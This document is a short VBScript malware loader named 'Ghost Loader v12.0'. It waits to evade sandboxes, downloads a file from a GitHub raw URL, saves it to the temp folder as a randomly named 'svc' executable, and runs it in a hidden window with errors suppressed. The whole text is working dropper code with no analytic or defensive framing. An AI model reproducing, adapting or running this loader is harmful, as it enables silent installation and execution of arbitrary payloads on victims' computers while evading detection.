' Ghost Loader v12.0 (Simple - No Chunks)
Option Explicit
On Error Resume Next

Dim ws, fs, xhr, stm
Set ws = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")

' Anti-sandbox
WScript.Sleep 2500

' Paths
Dim bd, fn, fp
bd = ws.ExpandEnvironmentStrings("%TEMP%")
fn = "svc" & Hex(Int(Rnd*9999)) & ".exe"
fp = bd & "\" & fn

' Single file download
Dim url
url = "https://raw.githubusercontent.com/sophieduval/der/main/update.dat"

Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xhr.Open "GET", url, False
xhr.Send

If xhr.Status = 200 Then
    Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write xhr.responseBody
    stm.SaveToFile fp, 2
    stm.Close
    Set stm = Nothing
    
    If fs.FileExists(fp) Then
        ws.Run """" & fp & """", 0, False
    End If
End If

Set xhr = Nothing
Set ws = Nothing
Set fs = Nothing
